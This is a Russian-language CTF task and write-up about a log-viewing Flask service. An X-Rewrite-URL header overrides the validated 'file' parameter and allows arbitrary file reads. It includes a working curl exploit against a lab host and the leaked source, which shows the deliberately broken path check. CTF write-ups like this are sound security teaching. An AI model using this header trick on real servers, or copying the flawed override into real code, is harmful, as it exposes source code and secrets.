**Задание:**

При разработке этого сервиса для просмотра логов наш ведущий архитектор оставил себе лазейку. Он рассуждал так: «Что, если в будущем наше приложение будет работать за сложной системой балансировки нагрузки или веб-прокси, которая будет изменять URL-адреса на лету? Нам нужен альтернативный, более надежный способ передать приложению нужный путь к файлу, который будет иметь приоритет над тем, что видно пользователю в адресной строке.»

Он реализовал этот «приоритетный канал» для передачи данных, но, кажется, забыл добавить в него те же проверки безопасности, что и в основной обработчик. В итоге, если приложению что-то «прошептать» правильным образом, оно проигнорирует очевидные параметры из URL и слепо последует этой новой инструкции.

Ваша задача – найти этот скрытый канал и использовать его, чтобы прочитать исходный код приложения.

Адрес: https://priority-channel.t1.bug-makers.ru

---
**Решение:**

В описании задачи сказано:

> «…наш ведущий архитектор оставил себе лазейку… альтернативный, более надежный способ передать приложению нужный путь к файлу, который будет иметь приоритет над тем, что видно пользователю в адресной строке»

Это буквально означает:

- Сервер проверяет специальный заголовок раньше параметра `file` в URL.
- Если этот заголовок есть, сервер использует путь из него вместо обычного `GET file=...`.

Добавим заголовок:

```text
X-Rewrite-URL: /app/app.py
```

И сервер:

- Игнорирует `file=access.log`.
- Берёт путь `/app/app.py` из `X-Rewrite-URL`.
- Отдаёт содержимое этого файла:

```shell
curl -s -H "X-Rewrite-URL:/app/app.py" "http://31.207.77.216:4012/logs?file=access.log" 

from flask import Flask, request, render_template, abort, send_from_directory
from flask import Response
import os


app = Flask(__name__)

FLAG = "BugCTF{XXXXXXXXXXXXXXX}"

@app.route('/static/<path:filename>')
def static_files(filename):
    return send_from_directory('static', filename)

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/logs')
def get_log():
    filename = request.args.get('file', 'access.log')
    if '..' in filename or filename.startswith('/'):
        abort(403)
    if request.headers.get('X-Rewrite-URL'):
        filename = request.headers.get('X-Rewrite-URL')

    log_dir = os.path.join(os.path.dirname(__file__), 'logs')
    full_path = os.path.abspath(os.path.join(log_dir, filename))

    if not os.path.isfile(full_path):
        return "File not found or is a directory!", 404

    try:
        with open(full_path, 'rb') as f:
            content = f.read()
        return Response(content, mimetype='text/plain')
    except Exception as e:
        return "Error reading file", 500

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
```